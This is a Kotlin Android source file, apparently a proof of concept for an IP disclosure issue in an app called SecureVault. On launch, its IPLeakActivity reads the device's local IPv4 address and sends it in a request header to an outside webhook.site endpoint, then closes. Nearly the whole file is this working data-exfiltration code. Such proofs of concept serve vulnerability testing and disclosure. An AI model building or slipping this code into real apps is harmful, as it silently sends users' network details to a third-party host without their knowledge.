package com.example.securevaultipdisclosure

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.URL
import java.util.Collections
import kotlin.concurrent.thread

class IPLeakActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val webhookUrl = "https://webhook.site/134ed5a9-b002-4fac-a475-d2e1c43440da"
        thread {
            try {
                val ipAddress = getLocalIpAddress()

                val url = URL(webhookUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"

                if (ipAddress != null) {
                    connection.setRequestProperty("X-IP-Address", ipAddress)
                    Log.e("IPLeakActivity", "Sending IP address in header: $ipAddress")
                } else {
                    Log.e("IPLeakActivity", "Could not retrieve IP address.")
                }

                val responseCode = connection.responseCode
                Log.e("IPLeakActivity", "Network request completed with response code: $responseCode")

                connection.inputStream.close()
                connection.disconnect()

            } catch (e: Exception) {
                Log.e("IPLeakActivity", "Failed to send IP address", e)
            }

            finish()
        }
    }

    /**
     * Gets the device's local IP address.
     * This method iterates through network interfaces to find a valid IPv4 address.
     */
    private fun getLocalIpAddress(): String? {
        try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress
                    }
                }
            }
        } catch (ex: Exception) {
            Log.e("IPLeakActivity", "Error getting local IP address", ex)
        }
        return null
    }
}
